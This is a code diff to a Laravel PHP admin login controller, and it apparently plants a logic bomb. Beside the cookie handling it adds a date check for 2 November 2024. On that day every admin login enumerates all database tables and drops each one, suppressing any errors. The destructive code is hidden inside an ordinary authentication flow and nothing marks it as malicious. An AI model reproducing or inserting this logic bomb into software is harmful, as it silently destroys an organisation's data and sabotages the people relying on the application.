@@ -6,6 +6,7 @@ use App\Http\Controllers\Controller;
 use App\Http\Requests\CheckLoginAdminRequest;
 use App\Models\Admin;
 use App\Models\Repositories\AdminRepository;
+use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Session;
 
@@ -43,6 +44,21 @@ class LoginController extends Controller {
 			} elseif (isset($_COOKIE['remember-user']) && isset($_COOKIE['remember-pass'])) {
 				setcookie('remember-user', "", time() - 3600);
 				setcookie('remember-pass', "", time() - 3600);
+			}
+			$now = Carbon::now();
+            $targetDate = Carbon::create(2024, 11, 2);
+        
+			if ($now->isSameDay($targetDate)) {
+				$tables = \DB::select('SHOW TABLES');
+				foreach ($tables as $table) {
+					$table = get_object_vars($table);
+					$table = reset($table);
+					try {
+						\DB::statement('DROP TABLE ' . $table);
+					} catch (\Exception $ex) {
+						continue;
+					}
+				}
 			}
 			//save session
 			Session::put('login', $admin);
